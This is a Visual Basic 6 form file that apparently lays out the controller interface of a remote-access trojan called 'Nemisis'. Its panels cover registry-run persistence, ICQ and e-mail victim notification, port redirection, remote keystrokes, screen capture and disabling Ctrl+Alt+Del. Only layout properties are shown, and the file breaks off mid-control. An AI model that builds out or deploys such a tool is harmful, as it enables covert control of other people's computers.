VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmClient 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Nemisis Client"
   ClientHeight    =   7485
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   9480
   Icon            =   "frmClient.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   7485
   ScaleWidth      =   9480
   StartUpPosition =   2  'CenterScreen
   Begin VB.PictureBox picFrame 
      Appearance      =   0  'Flat
      AutoRedraw      =   -1  'True
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   3820
      Index           =   14
      Left            =   2940
      ScaleHeight     =   3818.868
      ScaleMode       =   0  'User
      ScaleWidth      =   4000
      TabIndex        =   139
      Top             =   1200
      Visible         =   0   'False
      Width           =   4005
      Begin VB.TextBox Text5 
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   780
         TabIndex        =   149
         Top             =   2940
         Width           =   2475
      End
      Begin VB.Frame Frame7 
         Appearance      =   0  'Flat
         Caption         =   "HTTP Server Information"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   1035
         Left            =   780
         TabIndex        =   145
         Top             =   1680
         Width           =   2475
         Begin VB.CommandButton Command10 
            Appearance      =   0  'Flat
            Caption         =   "Get Current Information"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   6.75
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   180
            Style           =   1  'Graphical
            TabIndex        =   148
            Top             =   600
            Width           =   2115
         End
         Begin VB.Label Label11 
            Caption         =   "HitCounter: 0"
            BeginProperty DataFormat 
               Type            =   1
               Format          =   "H:mm:ss"
               HaveTrueFalseNull=   0
               FirstDayOfWeek  =   0
               FirstWeekOfYear =   0
               LCID            =   1033
               SubFormatType   =   4
            EndProperty
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   180
            TabIndex        =   146
            Top             =   300
            Width           =   2145
         End
      End
      Begin VB.Frame Frame6 
         Appearance      =   0  'Flat
         Caption         =   "HTTP Server Settings"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   1035
         Left            =   960
         TabIndex        =   142
         Top             =   360
         Width           =   2115
         Begin VB.TextBox Text4 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   225
            Left            =   1440
            TabIndex        =   144
            Text            =   "80"
            Top             =   360
            Width           =   495
         End
         Begin VB.Label Label13 
            Caption         =   "Default HTTP Port: 80"
            BeginProperty DataFormat 
               Type            =   1
               Format          =   "H:mm:ss"
               HaveTrueFalseNull=   0
               FirstDayOfWeek  =   0
               FirstWeekOfYear =   0
               LCID            =   1033
               SubFormatType   =   4
            EndProperty
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   180
            TabIndex        =   147
            Top             =   660
            Width           =   1755
         End
         Begin VB.Label Label10 
            Caption         =   "HTTP Local Port:"
            BeginProperty DataFormat 
               Type            =   1
               Format          =   "H:mm:ss"
               HaveTrueFalseNull=   0
               FirstDayOfWeek  =   0
               FirstWeekOfYear =   0
               LCID            =   1033
               SubFormatType   =   4
            EndProperty
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   180
            TabIndex        =   143
            Top             =   360
            Width           =   1245
         End
      End
      Begin VB.CommandButton Command9 
         Appearance      =   0  'Flat
         Caption         =   "Start HTTP Server"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   360
         Style           =   1  'Graphical
         TabIndex        =   141
         Top             =   3360
         Width           =   1575
      End
      Begin VB.CommandButton Command8 
         Appearance      =   0  'Flat
         Caption         =   "Stop HTTP Server"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   2040
         Style           =   1  'Graphical
         TabIndex        =   140
         Top             =   3360
         Width           =   1590
      End
   End
   Begin VB.PictureBox picFrame 
      Appearance      =   0  'Flat
      AutoRedraw      =   -1  'True
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   3825
      Index           =   4
      Left            =   2880
      ScaleHeight     =   3818.868
      ScaleMode       =   0  'User
      ScaleWidth      =   3984.906
      TabIndex        =   0
      Top             =   1140
      Visible         =   0   'False
      Width           =   3990
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Remove Server"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Index           =   32
         Left            =   1980
         TabIndex        =   119
         Top             =   3420
         Width           =   1875
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Save Settings"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Index           =   50
         Left            =   120
         TabIndex        =   14
         Top             =   3420
         Width           =   1875
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Close Server"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Index           =   19
         Left            =   1980
         TabIndex        =   54
         Top             =   3180
         Width           =   1875
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Restart Server"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Index           =   20
         Left            =   120
         MaskColor       =   &H8000000F&
         TabIndex        =   53
         Top             =   3180
         Width           =   1875
      End
      Begin VB.Frame Frame5 
         Appearance      =   0  'Flat
         Caption         =   "Startup Methods"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   795
         Left            =   120
         TabIndex        =   118
         Top             =   1044
         Width           =   1815
         Begin VB.CheckBox Check6 
            Appearance      =   0  'Flat
            Caption         =   "Reg RunServices"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000008&
            Height          =   255
            Left            =   120
            TabIndex        =   129
            Top             =   480
            Width           =   1515
         End
         Begin VB.CheckBox Check5 
            Appearance      =   0  'Flat
            Caption         =   "Reg Run"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000008&
            Height          =   255
            Left            =   120
            TabIndex        =   128
            Top             =   240
            Width           =   915
         End
      End
      Begin VB.Frame Frame4 
         Appearance      =   0  'Flat
         Caption         =   "Server Password"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   1155
         Left            =   120
         TabIndex        =   114
         Top             =   1920
         Width           =   3735
         Begin VB.TextBox txtPassword 
            Appearance      =   0  'Flat
            BeginProperty DataFormat 
               Type            =   1
               Format          =   "0"
               HaveTrueFalseNull=   0
               FirstDayOfWeek  =   0
               FirstWeekOfYear =   0
               LCID            =   1033
               SubFormatType   =   1
            EndProperty
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   120
            TabIndex        =   116
            Top             =   480
            Width           =   3495
         End
         Begin VB.Label Label6 
            Caption         =   "Password:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   120
            TabIndex        =   117
            Top             =   240
            Width           =   795
         End
         Begin VB.Label Label7 
            Caption         =   "Current Password: [-BLANK-]"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   225
            Left            =   120
            TabIndex        =   115
            Top             =   825
            Width           =   3495
         End
      End
      Begin VB.Frame Frame3 
         Appearance      =   0  'Flat
         Caption         =   "Server Port"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   855
         Left            =   120
         TabIndex        =   110
         Top             =   120
         Width           =   1815
         Begin VB.TextBox Text1 
            Appearance      =   0  'Flat
            BackColor       =   &H8000000F&
            BeginProperty DataFormat 
               Type            =   1
               Format          =   "0"
               HaveTrueFalseNull=   0
               FirstDayOfWeek  =   0
               FirstWeekOfYear =   0
               LCID            =   1033
               SubFormatType   =   1
            EndProperty
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   1140
            Locked          =   -1  'True
            TabIndex        =   121
            Top             =   540
            Width           =   555
         End
         Begin VB.TextBox txtPortNum 
            Appearance      =   0  'Flat
            BeginProperty DataFormat 
               Type            =   1
               Format          =   "0"
               HaveTrueFalseNull=   0
               FirstDayOfWeek  =   0
               FirstWeekOfYear =   0
               LCID            =   1033
               SubFormatType   =   1
            EndProperty
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   1140
            TabIndex        =   111
            Text            =   "6116"
            Top             =   240
            Width           =   555
         End
         Begin VB.Label Label8 
            Caption         =   "Current Port:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   225
            Left            =   90
            TabIndex        =   113
            Top             =   540
            Width           =   1005
         End
         Begin VB.Label Label5 
            Caption         =   "Default Port:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   120
            TabIndex        =   112
            Top             =   255
            Width           =   975
         End
      End
      Begin VB.Frame Frame2 
         Appearance      =   0  'Flat
         Caption         =   "Notify Methods"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   1725
         Left            =   2040
         TabIndex        =   105
         Top             =   120
         Width           =   1815
         Begin VB.TextBox Text3 
            Appearance      =   0  'Flat
            BeginProperty DataFormat 
               Type            =   1
               Format          =   "0"
               HaveTrueFalseNull=   0
               FirstDayOfWeek  =   0
               FirstWeekOfYear =   0
               LCID            =   1033
               SubFormatType   =   1
            EndProperty
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   120
            TabIndex        =   138
            Text            =   "mail"
            Top             =   1320
            Width           =   1575
         End
         Begin VB.TextBox txtEmail 
            Appearance      =   0  'Flat
            BeginProperty DataFormat 
               Type            =   1
               Format          =   "0"
               HaveTrueFalseNull=   0
               FirstDayOfWeek  =   0
               FirstWeekOfYear =   0
               LCID            =   1033
               SubFormatType   =   1
            EndProperty
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   120
            TabIndex        =   108
            Text            =   "mrtrix@gmx.net"
            Top             =   1020
            Width           =   1575
         End
         Begin VB.TextBox txtICQNum 
            Appearance      =   0  'Flat
            BeginProperty DataFormat 
               Type            =   1
               Format          =   "0"
               HaveTrueFalseNull=   0
               FirstDayOfWeek  =   0
               FirstWeekOfYear =   0
               LCID            =   1033
               SubFormatType   =   1
            EndProperty
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   255
            Left            =   120
            TabIndex        =   106
            Top             =   480
            Width           =   1575
         End
         Begin VB.Label Label4 
            Caption         =   "E-mail Notify:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   120
            TabIndex        =   109
            Top             =   780
            Width           =   975
         End
         Begin VB.Label Label9 
            Caption         =   "ICQ Notify:"
            BeginProperty Font 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   195
            Left            =   120
            TabIndex        =   107
            Top             =   240
            Width           =   855
         End
      End
   End
   Begin VB.PictureBox picFrame 
      Appearance      =   0  'Flat
      AutoRedraw      =   -1  'True
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   3820
      Index           =   13
      Left            =   2820
      ScaleHeight     =   3818.868
      ScaleMode       =   0  'User
      ScaleWidth      =   4000
      TabIndex        =   130
      Top             =   1080
      Visible         =   0   'False
      Width           =   4005
      Begin VB.CommandButton Command7 
         Caption         =   "Refresh List"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   1980
         TabIndex        =   136
         Top             =   3420
         Width           =   1875
      End
      Begin VB.CommandButton Command6 
         Caption         =   "Remove All"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   137
         Top             =   3420
         Width           =   1875
      End
      Begin VB.ListBox lstConnections 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   2565
         ItemData        =   "frmClient.frx":0CCA
         Left            =   120
         List            =   "frmClient.frx":0CCC
         TabIndex        =   135
         Top             =   750
         Width           =   3735
      End
      Begin VB.TextBox txtRemoteIP 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   134
         Text            =   "207.115.47.138"
         Top             =   120
         Width           =   3735
      End
      Begin VB.TextBox txtRemotePort 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   225
         Left            =   120
         TabIndex        =   133
         Text            =   "6667"
         Top             =   420
         Width           =   495
      End
      Begin VB.TextBox txtLocalPort 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   225
         Left            =   660
         TabIndex        =   132
         Text            =   "7117"
         Top             =   420
         Width           =   435
      End
      Begin VB.CommandButton cmdConnect 
         Caption         =   "Add Port Redirection"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   225
         Left            =   1140
         TabIndex        =   131
         Top             =   420
         Width           =   2715
      End
   End
   Begin VB.PictureBox picFrame 
      Appearance      =   0  'Flat
      AutoRedraw      =   -1  'True
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   3820
      Index           =   12
      Left            =   2760
      ScaleHeight     =   3818.868
      ScaleMode       =   0  'User
      ScaleWidth      =   4000
      TabIndex        =   122
      Top             =   1020
      Visible         =   0   'False
      Width           =   4005
      Begin VB.CommandButton Command5 
         Caption         =   "Refresh Window List"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   127
         ToolTipText     =   "Refresh the Task List"
         Top             =   1560
         Width           =   3735
      End
      Begin VB.ListBox lstWindows 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   1395
         IntegralHeight  =   0   'False
         Left            =   120
         Sorted          =   -1  'True
         TabIndex        =   126
         Top             =   120
         Width           =   3735
      End
      Begin VB.CommandButton Command4 
         Caption         =   "Clear Text Box"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   1980
         TabIndex        =   125
         Top             =   3420
         Width           =   1875
      End
      Begin VB.CommandButton Command3 
         Caption         =   "Send Keys"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   124
         Top             =   3420
         Width           =   1875
      End
      Begin VB.TextBox Text2 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   6.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   1515
         Left            =   120
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   123
         Top             =   1860
         Width           =   3735
      End
   End
   Begin VB.PictureBox picFrame 
      Appearance      =   0  'Flat
      AutoRedraw      =   -1  'True
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   3820
      Index           =   0
      Left            =   2700
      ScaleHeight     =   3818.868
      ScaleMode       =   0  'User
      ScaleWidth      =   4000
      TabIndex        =   39
      Top             =   960
      Width           =   4005
      Begin VB.TextBox txtNews 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3555
         Left            =   120
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   88
         Top             =   120
         Width           =   3735
      End
   End
   Begin VB.PictureBox picFrame 
      Appearance      =   0  'Flat
      AutoRedraw      =   -1  'True
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   3820
      Index           =   8
      Left            =   2640
      ScaleHeight     =   3818.868
      ScaleMode       =   0  'User
      ScaleWidth      =   4000
      TabIndex        =   92
      Top             =   900
      Visible         =   0   'False
      Width           =   4005
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Desktop Screen Capture"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Index           =   18
         Left            =   300
         TabIndex        =   102
         Top             =   3120
         Width           =   3375
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Ctrl+Alt+Del Off"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Index           =   10
         Left            =   1980
         TabIndex        =   96
         Top             =   2340
         Width           =   1695
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Close CD-ROM"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Index           =   14
         Left            =   1980
         TabIndex        =   97
         Top             =   1920
         Width           =   1695
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Restore Mouse Buttons"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Index           =   12
         Left            =   300
         TabIndex        =   95
         Top             =   1500
         Width           =   3375
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Open CD-ROM"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Index           =   13
         Left            =   300
         TabIndex        =   101
         Top             =   1920
         Width           =   1695
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Swap Mouse Buttons"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Index           =   11
         Left            =   300
         TabIndex        =   100
         Top             =   1140
         Width           =   3375
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Ctrl+Alt+Del On"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Index           =   9
         Left            =   300
         TabIndex        =   99
         Top             =   2340
         Width           =   1695
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Minimize All Windows"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Index           =   17
         Left            =   300
         TabIndex        =   98
         Top             =   2760
         Width           =   3375
      End
      Begin VB.TextBox txtURL 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   360
         Left            =   300
         TabIndex        =   94
         Text            =   "http:\\www.google.ca"
         Top             =   315
         Width           =   3375
      End
      Begin VB.CommandButton cmdCommand 
         Caption         =   "Open Website URL"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Index           =   0
         Left            =   300
         TabIndex        =   93
         Top             =   720
         Width           =   3375
      End
   End
   Begin VB.Timer tmrOnline 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   1560
      Top             =   1380
   End
   Begin VB.Timer tmrReconnect 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   1560
      Top             =   900
   End
   Begin MSWinsockLib.Winsock wskConnect 
      Left            =   1560
      Top             =   420
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSComctlLib.StatusBar statBar 
      Align           =   2  'Align Bottom
      Height          =   270
      Left            =   0
      TabIndex        =   6
      Top             =   7215
      Width           =   9480
      _ExtentX        =   16722
      _ExtentY        =   476
      Style           =   1
      SimpleText      =   "Status: Offline"
      _Version        =   393216
      BeginProperty Panels {8E3867A5-8586-11D1-B16A-00C0F0283628} 
         NumPanels       =   1
         BeginProperty Panel1 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
         EndProperty
      EndProperty
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin VB.CommandButton Command2 
      Appearance      =   0  'Flat
      Caption         =   "Disconnect"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   5100
      Style           =   1  'Graphical
      TabIndex        =   5
      Top             =   60
      Width           =   990
   End
   Begin VB.CommandButton Command1 
      Appearance      =   0  'Flat
      Caption         =   "Connect"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   6.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   4080
      Style           =   1  'Graphical
      TabIndex        =   4
      Top             =   60
      Width           =   975
   End
   Begin VB.TextBox txtPort 
      Appearance      =   0  'Flat
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   3600
      TabIndex        =   3
      Text            =   "6116"
      Top             =   60
      Width           =   435
   End
   Begin VB.TextBox txtIP 
      Appearance      =   0  'Flat
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
